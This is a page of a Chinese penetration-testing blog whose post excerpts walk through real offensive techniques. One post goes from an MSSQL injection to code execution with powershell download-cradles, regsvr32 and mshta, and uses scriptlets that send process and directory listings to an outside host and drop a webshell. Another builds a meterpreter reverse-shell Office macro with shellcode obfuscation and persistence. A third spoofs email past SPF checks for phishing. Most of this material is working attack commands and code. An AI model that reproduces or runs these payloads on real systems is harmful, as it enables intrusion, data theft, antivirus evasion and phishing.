<!DOCTYPE html>
<html>

  <head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  <title>倾旋的博客</title>
  <meta name="description" content="这个博客主要用来记录自己技术生涯中短小的收获和知识的备忘，还有就是一些做安全服务工作中的感受。方向可能会在不断改变：渗透测试、CTF、高效生活、应急响应、安全建设、读后感、代码审计、漏洞复现、运维杂项等等…
">

  <link rel="stylesheet" href="/css/main.css">
  <link rel="canonical" href="https://payloads.online/page8/">
  <link rel="alternate" type="application/rss+xml" title="倾旋的博客" href="https://payloads.online/feed.xml">
</head>


  <body>

    <div class="header-placeholder"></div>
<header class="header">
  <div class="wrapper">
    <div id="sidebar-toggle">TOC</div>
    <a class="site-title" href="/">倾旋的博客</a>
    <nav class="site-nav">
      
        
        <a class="page-link" href="/about/">About</a>
      
        
        <a class="page-link" href="/posts/">Posts</a>
      
        
        <a class="page-link" href="/links/">Links</a>
      
        
        <a class="page-link" href="https://cooolis.payloads.online/">Cooolis</a>
      
        
        <a class="page-link" href="/feed.xml">RSS</a>
      
    </nav>
  </div>
</header>


    <div class="page-content">
      <div class="wrapper">
        <div class="col-main">
          <div class="home">
  <a class="rss-link" href="/feed.xml">RSS Feed</a>
  <h1 class="page-heading">Articles</h1>

  <ul class="post-list">
    
      <li>
        <h2>
          <a class="post-link" href="/archivers/2019-07-19/1">Regsvr32 ole对象</a>
        </h2>
        
        <div class="post-meta">Jul 19, 2019</div>

        <div class="post-excerpt">
          <!--<h1 id="某次项目技术点实录-regsvr32-ole对象">某次项目技术点实录-Regsvr32 ole对象</h1>

<p><strong>由于环境都无法进行演示，目前取得都是历史留存的截图</strong></p>

<h2 id="突破口">突破口</h2>

<p>一开始是一个外网的SQL注入，通过sqlmap正常操作，得知是DBA权限，数据库：MSSQL</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sqlmap.py -u "http://xxx.com/xxx/xxx.aspx?yum=xx&xx=xx" -p yhm --random-agent --cookie='ASP.NET_SessionId=xxxx'
</code></pre></div></div>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2019-07-19/2019-07-19-13-57-49.png" alt="" /></p>

<p>直接通过<code class="language-plaintext highlighter-rouge">--os-shell</code>来执行命令：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[18:39:23] [INFO] checking if xp_cmdshell extended procedure is available, please wait..
xp_cmdshell extended procedure does not seem to be available. Do you want sqlmap to try to re-enable it? [Y/n] Y
[18:39:25] [WARNING] xp_cmdshell re-enabling failed
</code></pre></div></div>

<h3 id="启用xp_cmdshell">启用xp_cmdshell</h3>

<p>手动启动语句：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>EXEC sp_configure 'show advanced options', 1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell', 1;RECONFIGURE;
</code></pre></div></div>

<p>执行：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>exec master..xp_cmdshell "whoami"
</code></pre></div></div>

<h3 id="启用ole-automation">启用OLE Automation</h3>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2019-07-19/2019-07-19-15-19-48.png" alt="" /></p>

<p>通过启用xp_cmdshell失败，sqlmap还会尝试<code class="language-plaintext highlighter-rouge">sp_OACreate</code>，<code class="language-plaintext highlighter-rouge">sp_OACreate</code>这个方式是不带回显的，通常利用语句如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>EXEC sp_configure 'show advanced options', 1;   
RECONFIGURE WITH OVERRIDE;   
EXEC sp_configure 'Ole Automation Procedures', 1;
RECONFIGURE WITH OVERRIDE;   
EXEC sp_configure 'show advanced options', 0;
</code></pre></div></div>

<p>执行：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>declare @shell int exec sp_oacreate 'wscript.shell',@shell output exec sp_oamethod @shell,'run',null,'c:\windows\system32\cmd.exe /c whoami &gt;C:\who.txt'
</code></pre></div></div>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2019-07-19/2019-07-19-14-07-02.png" alt="" /></p>

<p>通过调用<code class="language-plaintext highlighter-rouge">sp_oacreate</code>能够获得一个数字返回值，若全是0，则执行失败，必须有1。</p>

<h2 id="判断网络环境">判断网络环境</h2>

<p>能执行命令后，为了判断能否出网，先尝试DNS Log。</p>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2019-07-19/2019-07-19-14-08-54.png" alt="" /></p>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2019-07-19/2019-07-19-14-09-18.png" alt="" /></p>

<p>在<code class="language-plaintext highlighter-rouge">os-shell</code>中，执行：<code class="language-plaintext highlighter-rouge">nslookup xxxxx.net</code>，burp看回显即可。</p>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2019-07-19/2019-07-19-14-11-13.png" alt="" /></p>

<p>DNS能出，接下来看TCP报文…</p>

<p>这里我使用<code class="language-plaintext highlighter-rouge">certutil</code>、<code class="language-plaintext highlighter-rouge">bitsadmin</code>命令来测试，但是么有截图…</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ python3 -m http.server
</code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>os-shell&gt;certutil -urlcache -split -f http://xxx:8000/
</code></pre></div></div>

<p>收到相应的请求后，基本上稳妥了，可以采用<code class="language-plaintext highlighter-rouge">reverse_tcp</code>的方案，用powershell反弹一个beacon到cobalt strike上。</p>

<h2 id="regsvr32妙用">Regsvr32妙用</h2>

<p>测试的过程中，并不顺利，后来我发现它有反病毒软件…</p>

<p>尝试了以下方法：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://xx.xx.xx.xx/a22'))"

regsvr32 /s /n /u /i:http://x.x.0.x:8080/zfgJrh6V.sct scrobj.dll

mshta http://xxx.xx.xx.xx/1.hta
</code></pre></div></div>

<p>然后我发现msf <code class="language-plaintext highlighter-rouge">exploit/multi/script/web_delivery</code>生成的地址，都会在底层调用一层<code class="language-plaintext highlighter-rouge">powershell</code></p>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2019-07-19/2019-07-19-14-45-14.png" alt="" /></p>

<p>目前，这种download+iex方式肯定不行了，然后我就改了几个脚本，通过HTTP Log来回显执行结果：</p>

<p>获取进程列表：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;?XML version="1.0"?&gt;
&lt;scriptlet&gt;
	&lt;registration progid="d08c96" classid="{cea46581-c344-4157-b891-30f358f1522d}" &gt;
		&lt;script language="vbscript"&gt;
&lt;![CDATA[
Sub getName(name)
  	Dim http
	Set http = CreateObject("Msxml2.ServerXMLHTTP")
	http.open "GET","http://xxx.xxx.xxx.xxx:8086/"+name, False
	http.send
End Sub

Sub Cmd(command)
Set oShell = CreateObject("WScript.Shell")
Set Re = oShell.Exec(command)

Do While Not Re.StdOut.AtEndOfStream
	getName Re.StdOut.ReadLine()
Loop
End Sub

Cmd "powershell -w hidden -c $s=Get-Process;$process ='';foreach ($n in $s){$process += $n.Name+'|'}$Bytes = [System.Text.Encoding]::Unicode.GetBytes($process);$EncodedText =[Convert]::ToBase64String($Bytes);Write-Host $EncodedText;exit;"
]]&gt;
		&lt;/script&gt;
	&lt;/registration&gt;
&lt;/scriptlet&gt;
</code></pre></div></div>

<p>执行：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wmic process call create "regsvr32 /s /n /u /i:http://xxx.xxx.xxx.xxx:8086/p.txt scrobj.dll"
</code></pre></div></div>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2019-07-19/2019-07-19-14-51-18.png" alt="" /></p>

<p>获得回显。</p>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2019-07-19/2019-07-19-14-48-39.png" alt="" /></p>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2019-07-19/2019-07-19-14-49-25.png" alt="" /></p>

<p>获得进程列表后，看到有<code class="language-plaintext highlighter-rouge">EST Nod32</code>、<code class="language-plaintext highlighter-rouge">360</code>等防护软件，看来需要做的工作有很多。</p>

<p>列目录：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;?XML version="1.0"?&gt;
&lt;scriptlet&gt;
	&lt;registration progid="d08c96" classid="{cea46581-c344-4157-b891-30f358f1522d}" &gt;
		&lt;script language="vbscript"&gt;
&lt;![CDATA[
Sub getName(name)
  	Dim http
	Set http = CreateObject("Msxml2.ServerXMLHTTP")
	http.open "GET","http://xxx.xxx.xxx.xxx:8086/"+name, False
	http.send
End Sub

Sub Cmd(command)
Set oShell = CreateObject("WScript.Shell")
Set Re = oShell.Exec(command)

Do While Not Re.StdOut.AtEndOfStream
	getName Re.StdOut.ReadLine()
Loop
End Sub

Cmd "powershell -w hidden -c $s=Get-ChildItem D:\web4_new\;$process ='';foreach ($n in $s){$process += $n.Name+'|'}$Bytes = [System.Text.Encoding]::Unicode.GetBytes($process);$EncodedText =[Convert]::ToBase64String($Bytes);Write-Host $EncodedText;exit;"
]]&gt;
		&lt;/script&gt;
	&lt;/registration&gt;
&lt;/scriptlet&gt;
</code></pre></div></div>

<p>下载Webshell：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;?XML version="1.0"?&gt;
&lt;scriptlet&gt;
	&lt;registration progid="d08c96" classid="{cea46581-c344-4157-b891-30f358f1522d}" &gt;
		&lt;script language="vbscript"&gt;
		&lt;![CDATA[
Set Shell = CreateObject("Wscript.Shell")
Set Post = CreateObject("Msxml2.XMLHTTP")
wfolder = "C:\inetpub\wwwroot\xxx\111english.aspx"
Post.Open "GET","http://xxx.xxxx.xxx.xxx:85/bak/english.txt",0
Post.Send()
Set aGet = CreateObject("ADODB.Stream")
aGet.Mode = 3
aGet.Type = 1
aGet.Open()
aGet.Write(Post.responseBody)

aGet.SaveToFile wfolder,2

		]]&gt;
		&lt;/script&gt;
	&lt;/registration&gt;
&lt;/scriptlet&gt;
</code></pre></div></div>
<p>通过指定不同的txt，执行不同的代码。</p>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2019-07-19/2019-07-19-14-53-53.png" alt="" /></p>

<p>当然，毫无疑问的最终获得了beacon：</p>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2019-07-19/2019-07-19-14-54-58.png" alt="" /></p>

<p>免杀环节就不记录了。</p>

<h2 id="总结">总结</h2>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2019-07-19/2019-07-19-14-59-19.png" alt="" /></p>

<p>外网多个SQL注入-SQL Server DBA，无回显，360+ESET NOD32 Antivirus，regsvr32通过一个ole对象执行VBscript，使用<code class="language-plaintext highlighter-rouge">--os-shell</code>，底层执行的父进程是一个mssql service，所以av可能不那么关注，但是通过–os-shell直接创建powershell，就会被拦截；</p>

<p>通过加载我服务器上的sct文件，执行自定义的vbs之外，我发现它不会阻止vbs派生powershell；</p>

<p>但是通过vbs直接派生powershell下载代码执行、或直接反弹，都被干掉。由于没有回显，无法确定我免杀的木马落地目录，只能用powershell获取目录、当前用户情况，返回base64，交给vbs，请求http log。得到服务器环境，最终确定落地目录后，基本上就可以getshell、上线等操作。</p>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2019-07-19/2019-07-19-15-08-36.png" alt="" /></p>

<p>由于反病毒软件会监控xp_cmdshell，一执行就会返回<code class="language-plaintext highlighter-rouge">CreateProcess Error Code 5</code>等问题，<code class="language-plaintext highlighter-rouge">sp_oacreate</code>是能够解决，但是没有回显，可通过发送网络请求来看。</p>

<p>sp_oacreate是基于ole对象的，ole对象执行拦截的较少、包括regsvr32也是调用的ole对象去执行vbs代码，这其中有一种白名单派生关系。</p>

<p>语法</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sp_OACreate progid, | clsid,
objecttoken OUTPUT
[ , context ]
</code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>declare @shell int exec sp_oacreate 'wscript.shell',@shell output exec sp_oamethod @shell,'run',null,'c:\windows\system32\cmd.exe /c whoami &gt;C:\who.txt'
</code></pre></div></div>

<p>其中<code class="language-plaintext highlighter-rouge">'wscript.shell'</code>就是一个对象，这个对象可以是其他ole对象，具体还需要继续发掘。。</p>

-->
          <!---->
          某次项目技术点实录-Regsvr32 ole对象
          <p>
            <a class="post-link" href="/archivers/2019-07-19/1">Read More »</a>
          </p>
        </div>
      </li>
    
      <li>
        <h2>
          <a class="post-link" href="/archivers/2019-07-01/1">安恒信息 - 诚招“安全研究员” v2.0【文末福利】</a>
        </h2>
        
        <div class="post-meta">Jul 1, 2019</div>

        <div class="post-excerpt">
          <!--<h1 id="安全招聘">安全招聘</h1>

<ul>
  <li>公司：安恒信息</li>
  <li>岗位：红蓝对抗 安全研究员</li>
  <li>部门：战略支援部</li>
  <li>薪资：13-30K</li>
  <li>工作年限：2年+</li>
  <li>工作地点：浙江·杭州(总部)，广东·广州、深圳，北京，四川·成都</li>
  <li>工作环境：一座大厦，健身场所，医师，帅哥，美女，高级食堂…</li>
</ul>

<h2 id="岗位职责">岗位职责</h2>

<ul>
  <li>1.定期面向部门、全公司技术分享;</li>
  <li>2.前沿攻防技术研究、跟踪国内外安全领域的安全动态、漏洞披露并落地沉淀；</li>
  <li>3.负责完成部门渗透测试、红蓝对抗业务;</li>
  <li>4.负责对安全漏洞进行跟踪、挖掘、并写出利用工具；</li>
  <li>5.负责落地ATT&amp;CK矩阵攻击、对抗技术 ；</li>
</ul>

<h2 id="岗位要求">岗位要求</h2>

<ul>
  <li>1.至少2-3年安全领域工作经验；</li>
  <li>2.熟悉Linux/Windows操作系统原理；</li>
  <li>3.拥有参与大型目标渗透攻防案例；</li>
  <li>4.了解域环境、工作组知识概念，熟悉Windows认证原理；</li>
  <li>5.熟悉TCP/IP协议，具有协议分析经验，能熟练使用各种协议分析工具；</li>
  <li>6.熟悉各种攻防技术以及安全漏洞原理；</li>
  <li>7.有过独立分析漏洞的经验，熟悉各种调试技巧，能熟练使用调试工具；</li>
  <li>8.熟悉常见编程语言中的至少一种（C/C++、C#、Python、php、java）</li>
</ul>

<h2 id="加分项">加分项</h2>

<ul>
  <li>1.具备良好的英语文档阅读能力；</li>
  <li>2.曾参加过技术沙龙担任嘉宾进行技术分享；</li>
  <li>3.具有CISSP、CISA、CSSLP、ISO27001、ITIL、PMP、COBIT、Security+、CISP等安全相关资质者；</li>
  <li>4.具有大型SRC漏洞提交经验、获得年度表彰、大型CTF夺得名次者；</li>
  <li>5.开发过安全相关的开源项目；</li>
  <li>6.具备良好的人际沟通、协调能力、分析和解决问题的能力者优先；</li>
  <li>7.个人技术博客；</li>
  <li>8.在优质社区投稿过文章；</li>
</ul>

<p>简历投递至 Les.li@dbappsecurity.com.cn</p>

<p>PS：邮件主题中请注明工作意向城市</p>

<h2 id="公司福利">公司福利</h2>

<h3 id="美味食堂">美味食堂</h3>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/0db718a611c4c088a9dc6667c4459a2d.png" alt="2019-07-03-08-47-12" /></p>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/49447fd04c9baa54bfb6066f50b5d5a2.png" alt="2019-07-03-08-46-34" /></p>

<p><a href="https://mp.weixin.qq.com/s/eV62SA6KvsZZxYJB5bcxrA">点我参观食堂</a></p>

<h3 id="中医看病">中医看病</h3>

<p>中医直接上门服务！
把脉问诊、健康咨询，
一系列服务，全方面到位！全部免费！</p>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/b82ef8d3760e5b8df5dfb2af5cd66f89.png" alt="2019-07-03-08-50-09" /></p>

<p><a href="https://mp.weixin.qq.com/s/aC6Oyu5b4pj7k-T2xHRaEA">点我围观</a></p>

<h3 id="安恒大厦">安恒大厦</h3>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/0f628b42182973d8af7a55b1cc701566.png" alt="2019-07-03-08-52-31" /></p>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/b1bb695d5c62daf857481c5b3b818959.png" alt="2019-07-03-08-53-28" /></p>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/1b4d5528f5e0dff92d3ac3391b525a91.png" alt="2019-07-03-08-53-53" /></p>

<p><a href="https://mp.weixin.qq.com/s/cXwxQvBQq5Cf7Uv9oB7p_A">点我参观</a></p>

-->
          某活动结束，是时候搞点大事情了！
          <p>
            <a class="post-link" href="/archivers/2019-07-01/1">Read More »</a>
          </p>
        </div>
      </li>
    
      <li>
        <h2>
          <a class="post-link" href="/archivers/2019-05-16/1">office宏</a>
        </h2>
        
        <div class="post-meta">May 16, 2019</div>

        <div class="post-excerpt">
          <!--<h2 id="0x00-宏---macro">0x00 宏 - Macro</h2>

<p>office宏，译自英文单词Macro。宏是微软公司为其office软件包设计的一个特殊功能，软件设计者为了让人们在使用软件进行工作时，避免一再地重复相同的动作而设计出来的一种工具，它利用简单的语法，把常用的动作写成宏，当在工作时，就可以直接利用事先编好的宏自动运行，去完成某项特定的任务，而不必再重复相同的动作，目的是让用户文档中的一些任务自动化。</p>

<p>Visual Basic for Applications（VBA）是Visual Basic的一种宏语言，是微软开发出来在其桌面应用程序中执行通用的自动化(OLE)任务的编程语言。主要能用来扩展Windows的应用程序功能，特别是Microsoft Office软件。也可说是一种应用程式视觉化的Basic 脚本。该语言于1993年由微软公司开发的的应用程序共享一种通用的自动化语言-Visual Basic for Application(VBA)，实际上VBA是寄生于VB应用程序的版本。</p>

<h2 id="0x01-生成宏">0x01 生成宏</h2>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>msfvenom <span class="nt">-p</span> windows/x64/meterpreter/reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>71.19.144.69 <span class="nv">LPORT</span><span class="o">=</span>8899 <span class="nt">-f</span> vba <span class="nt">-o</span> try.vba
</code></pre></div></div>

<p>使用msf就可以生成宏代码，接下来只要放入word或者excel、ppt即可。</p>

<h2 id="0x02-创建宏">0x02 创建宏</h2>

<p>新建一个文档，另存为“启用宏的Word文档”：</p>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/f905ed50aefb30dab9fbd923e1b296a1.png" alt="2019-05-15-14-00-36" /></p>

<p>视图-查看宏：</p>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/e0140a93e1c3cf38cac2031d4f3e20a7.png" alt="2019-05-15-14-02-48" /></p>

<p>随便输入一个宏名称，点击“创建”：</p>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/59c264e10758640d4a05a3ccecccf4f9.png" alt="2019-05-15-14-03-34" /></p>

<p>此时进入宏编辑器：</p>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/a659557648212e62b9cd221b7306c7cf.png" alt="2019-05-15-14-04-57" /></p>

<p>将msf生成的payload放入：</p>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/c8d03acde64f5652936b7b4757c1ddfc.png" alt="2019-05-15-14-05-45" /></p>

<p>保存文件，关闭，再打开即可执行宏代码。</p>

<h2 id="0x03-宏代码分析">0x03 宏代码分析</h2>

<p>msf生成默认的vba会导入三个api函数，常见的shellcode加载器代码：</p>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/f07106d7fd8e17930a285fa9e20c824c.png" alt="2019-05-15-14-07-11" /></p>

<ul>
  <li>CreateThread 创建线程</li>
  <li>VirtualAlloc 申请虚拟内存空间</li>
  <li>RtlMoveMemory 拷贝内存</li>
</ul>

<div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">HANDLE</span> <span class="nf">CreateThread</span><span class="p">(</span>
  <span class="n">LPSECURITY_ATTRIBUTES</span>   <span class="n">lpThreadAttributes</span><span class="p">,</span>
  <span class="n">SIZE_T</span>                  <span class="n">dwStackSize</span><span class="p">,</span>
  <span class="n">LPTHREAD_START_ROUTINE</span>  <span class="n">lpStartAddress</span><span class="p">,</span>
  <span class="n">__drv_aliasesMem</span> <span class="n">LPVOID</span> <span class="n">lpParameter</span><span class="p">,</span>
  <span class="n">DWORD</span>                   <span class="n">dwCreationFlags</span><span class="p">,</span>
  <span class="n">LPDWORD</span>                 <span class="n">lpThreadId</span>
<span class="p">);</span>
</code></pre></div></div>

<div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">LPVOID</span> <span class="nf">VirtualAlloc</span><span class="p">(</span>
  <span class="n">LPVOID</span> <span class="n">lpAddress</span><span class="p">,</span>
  <span class="n">SIZE_T</span> <span class="n">dwSize</span><span class="p">,</span>
  <span class="n">DWORD</span>  <span class="n">flAllocationType</span><span class="p">,</span>
  <span class="n">DWORD</span>  <span class="n">flProtect</span>
<span class="p">);</span>
</code></pre></div></div>

<div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">VOID</span> <span class="nf">RtlMoveMemory</span><span class="p">(</span>
  <span class="n">VOID</span> <span class="o">*</span> <span class="n">Destination</span><span class="p">,</span>
  <span class="n">VOID</span> <span class="o">*</span> <span class="n">Source</span><span class="p">,</span>
  <span class="n">DWORD</span> <span class="n">Length</span>
<span class="p">);</span>
</code></pre></div></div>

<p>其中<code class="language-plaintext highlighter-rouge">Array(72,131,228,240,232,...</code>就是shellcode，混淆的办法有很多种。</p>

<p>shellcode可以自己在VBA里解码或者比如每个元素自增1，运行的时候-1，达到免杀…</p>

<h2 id="0x04-效果">0x04 效果</h2>

<blockquote>
  <p>在线地址：<a href="https://www.bilibili.com/video/av52532639/">https://www.bilibili.com/video/av52532639/</a></p>
</blockquote>

<iframe src="//player.bilibili.com/player.html?aid=52532639&page=1&cid" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true" width="95%" height="450"> </iframe>

<h2 id="0x05-拓展分析">0x05 拓展分析</h2>

<p>如果创建的是全局宏，Office会在这个目录生成一个dotm文档：</p>

<p><code class="language-plaintext highlighter-rouge">C:\Users\&lt;USERNAME&gt;\AppData\Roaming\Microsoft\Templates</code></p>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/be60c1522a347282be8fcbfc77b69986.png" alt="2019-05-15-14-53-42" /></p>

<p>全局宏是对于当前计算机所有文档对象有效，即文档本身不包含宏代码，也可以运行全局宏。</p>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/0a83240eaa48371c5af1d45b94e9a6c8.png" alt="2019-05-15-14-54-49" /></p>

<p>很遗憾，全局宏没有一个固定的名称，也就是说要先通过Office创建一个全局宏，然后其他文档打开时才可以执行代码。</p>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/b93a33d4a8037bb9bbaf0ab152cf7e61.png" alt="2019-05-15-15-52-06" /></p>

<p>经过测试，这个全局宏中的文件：<code class="language-plaintext highlighter-rouge">vbaProject.bin</code>是包含了特征的文件，但是反病毒软件不会扫描这个文件，除非主动查杀。</p>

<p>这个特性可能可以达到维持权限的作用。</p>

<p><strong>后来才发现我使用的还是全局宏达到的免杀</strong></p>

<p>HKEY_CURRENT_USER\Software\Microsoft\Office\16.0\PowerPoint\Security\Trusted Locations</p>

<p>同过PorcessMonitor分析，从注册表找到几个授信目录：</p>

<ul>
  <li>%APPDATA%\Microsoft\Templates</li>
  <li>C:\Program Files\Microsoft Office\Root\Templates\</li>
  <li>%APPDATA%\Microsoft\Addins</li>
  <li>C:\Program Files\Microsoft Office\Root\Document Themes 16\</li>
</ul>

-->
          <!---->
          从msf生成的宏来学习
          <p>
            <a class="post-link" href="/archivers/2019-05-16/1">Read More »</a>
          </p>
        </div>
      </li>
    
      <li>
        <h2>
          <a class="post-link" href="/archivers/2019-05-09/1">Swaks伪造邮件</a>
        </h2>
        
        <div class="post-meta">May 9, 2019</div>

        <div class="post-excerpt">
          <!--<h2 id="0x00-swaks">0x00 swaks</h2>

<p>swaks - Swiss Army Knife SMTP, the all-purpose smtp transaction tester.</p>

<p>swaks堪称SMTP协议的瑞士军刀，使用它我们可以灵活的操作SMTP协议报文，这篇文章主要是记录一下我是如何伪造一封邮件绕过gmail的检测。</p>

<p>通常最简单的发送命令：</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>swaks <span class="nt">--to</span> user@example.com <span class="nt">--server</span> test-server.example.net
</code></pre></div></div>

<p>但是邮件头中会带上<code class="language-plaintext highlighter-rouge">X-Mailer</code>：</p>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/002a7f0de092a69a661400aaf83e2d4a.png" alt="2019-05-09-14-24-53" /></p>

<p>同时，SPF检测会FAIL。</p>

<h2 id="0x01-smtp2go">0x01 smtp2go</h2>

<p>这个是从evi1cg师傅那里看到的，smtp2go主要是相当于邮件托管，可以分发子账户进行发送。</p>

<p>地址：https://support.smtp2go.com/hc/en-gb</p>

<p>（邮箱注册）普通账户可以免费发1000封邮件。</p>

<p>分配好账户后，可以通过swaks进行登录发送邮件：</p>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/b8b6ba65c1870a17710b0cbfe77359b3.png" alt="2019-05-09-14-28-50" /></p>

<h2 id="0x02-swaks发送邮件">0x02 swaks发送邮件</h2>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>swaks <span class="nt">--to</span> rvn0xsy@gmail.com <span class="nt">--from</span> admin@qq.com <span class="nt">--ehlo</span> gmail.com <span class="nt">--body</span> hello <span class="nt">--server</span> mail.smtp2go.com <span class="nt">-p</span> 2525 <span class="nt">-au</span> &lt;USER&gt; <span class="nt">-ap</span> &lt;PASS&gt;
</code></pre></div></div>

<p>但是上面这个邮件无法绕过SPF。</p>

<h2 id="0x03-spf验证原理">0x03 SPF验证原理</h2>

<p>如果mail.smtp2go.com是我的邮件服务器，那么gmail服务器收到的源IP也肯定是mail.smtp2go.com的IP。</p>

<p>gmail会校验邮件发送者的IP是否存在于smtp.from的域名spf配置列表里。</p>

<p>而上面这条命令：</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>swaks <span class="nt">--to</span> rvn0xsy@gmail.com <span class="nt">--from</span> admin@qq.com <span class="nt">--ehlo</span> gmail.com <span class="nt">--body</span> hello <span class="nt">--server</span> mail.smtp2go.com <span class="nt">-p</span> 2525 <span class="nt">-au</span> &lt;USER&gt; <span class="nt">-ap</span> &lt;PASS&gt;
</code></pre></div></div>

<p>smtp.from就是admin@qq.com，和mail.smtp2go.com的IP肯定不同，所以SPF校验失败，而校验失败的邮件，会有很高的几率被扔到垃圾邮件中。</p>

<p>默认情况下，如果未设置Mail.From也就是邮件头的From，则会使用smtp.from作为Mail.From。</p>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/323e7ae3e0e177b37b051c421b31c1ad.png" alt="2019-05-09-14-38-39" /></p>

<h2 id="0x04-绕过spf">0x04 绕过SPF</h2>

<p>由于邮件显示的是Header中的From不是smtp.from，因此可以将smtp.from设置为正常的邮件服务器地址，伪造一个Mail.From即可。</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>swaks <span class="nt">--to</span> payloads@aliyun.com <span class="nt">--from</span> xx@smtp2go.com <span class="nt">--h-From</span>: <span class="s1">'管理员&lt;admin@qq.com&gt;'</span> <span class="nt">--ehlo</span> gmail.com <span class="nt">--body</span> hello <span class="nt">--server</span> mail.smtp2go.com <span class="nt">-p</span> 2525 <span class="nt">-au</span> &lt;USER&gt; <span class="nt">-ap</span> &lt;PASSS&gt;
</code></pre></div></div>

<p>Gmail接收到这封邮件后，会校验<code class="language-plaintext highlighter-rouge">--from xx@smtp2go.com</code>中的smtp2go.com是否等于mail.smtp2go.com的IP，由于是相等的，所以完成了SPF的校验。</p>

<p>而DKIM是校验邮件完整性的，smtp2go与Gmail直接使用的是TLS，不会发生什么问题。</p>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/a5868ef92b72691b8d0e36328cf174f6.png" alt="2019-05-09-14-42-55" /></p>

<h2 id="0x05-header">0x05 Header</h2>

<p>swaks支持自定义某些Header，参数如下：</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>swaks <span class="nt">--header-</span>&lt;Name&gt; &lt;Value&gt;
</code></pre></div></div>

<p>如果我想去除Mailer特征，就可以这么做：</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>swaks <span class="nt">--header-X-Mailer</span> gmail.com <span class="nt">--to</span> payloads@aliyun.com <span class="nt">--from</span> xx@smtp2go.com <span class="nt">--h-From</span>: <span class="s1">'管理员&lt;admin@qq.com&gt;'</span> <span class="nt">--ehlo</span> gmail.com <span class="nt">--body</span> hello <span class="nt">--server</span> mail.smtp2go.com <span class="nt">-p</span> 2525 <span class="nt">-au</span> &lt;USER&gt; <span class="nt">-ap</span> &lt;PASSS&gt; 
</code></pre></div></div>

<h2 id="0x06-附件钓鱼">0x06 附件、钓鱼</h2>

